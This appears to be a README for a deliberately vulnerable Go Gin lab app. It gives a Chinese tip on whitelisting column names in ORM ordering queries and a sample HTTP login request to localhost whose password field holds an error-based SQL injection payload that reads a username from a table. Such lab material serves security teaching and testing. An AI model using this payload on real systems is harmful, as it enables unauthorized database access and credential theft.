# Go Gin vul Example 

An example of gin contains many useful vul



#0x01 sqlli

由于表/列名无法使用参数化查询，所以推荐使用白名单或转义操作
````
db.Order(xxxx).First(&user)

// 对于列名
validCols := map[string]bool{"col1": true, "col2":true}

if _, ok := validCols[xxxx]; !ok {
fmt.Println("illegal column")
return
}
db.Order(xxxx)
````


``
POST /sql/login HTTP/1.1
Host: 127.0.0.1:8000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Content-Type: application/x-www-form-urlencoded
Content-Length: 106

user=user&password=123456 AND EXTRACTVALUE(9509,CONCAT(0x5c,(SELECT user from blog.blog_login LIMIT 0,1)))
``